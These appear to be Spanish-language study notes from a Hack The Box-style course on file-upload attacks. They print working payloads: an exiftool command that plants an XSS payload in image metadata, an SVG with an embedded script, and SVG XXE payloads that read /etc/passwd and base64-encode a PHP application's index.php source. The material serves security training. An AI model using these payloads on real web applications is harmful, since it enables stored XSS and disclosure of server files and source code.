
Solo permiten la subida de archivos especificos

Hay ciertas extensiones como SVG, HTML, XML o algunas de imagen y documentos pueden permitirnos introducir nuevas vulns en la aplicacion web


## XSS

Muchos tipos de archivos nos pueden permitir introducir una vuln de XSS Almacenado (Stored)


1. El ejemplo mas basico es cuando nos dejan subir archivos .HTML. Aunque no podamos ejecutar codigo PHP, aun podemos ejecutar codigo JS para realizar un XSS o CSRF a quien visite la pagina HTML subida



2. Otro ejhemplo son aplicaciones que muestras los metadatos de una imagen despues de subirla. Podemos usar exiftool -Comment='XSS EN JS'

Modificar los metadatos:

```
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
![[Pasted image 20260722151942.png]]

Ademas si cambiamos el MIME-Type de image a text/html, la aplicacion web puede mostrarla como un domcumento HTML en lugar de una imagen en cuyo caso el payload XSS se activara



3. Tambien se pueden llevar a cabo con imagenes SVG (Imagenes de graficos vectoriales escalables) basadas en XML y describen graficos vectoriales 2D

Podemos modificar los datos XML para incluir un payload XSS en el archivo HTB.svg:

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> 
	<rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /> 
	<script type="text/javascript">alert(window.origin);</script> 
</svg>
```
![[Pasted image 20260722152342.png]]

Cada vez que se muestre la imagen en la pagina web se ejecutara


## XXE

Con imagenes SVG podemos incluir datos XML para exfiltrar el codigo fuente de la aplicacion y otros documentos. Ejemplo para /etc/passwd

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<svg>&xxe;</svg>
```
![[Pasted image 20260722152533.png]]

Una vez subida la imagen y se visite la pagina web, veremos el contenido del archivo impresa o en el codigo fuente


Podemos usarlo para leer el codigo fuente de aplicaciones web PHP:
```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>
```
![[Pasted image 20260722152923.png]]

Otros archivos que usan XML para especificar formato y estructura:

- Docx
- Pdf
- Ppt
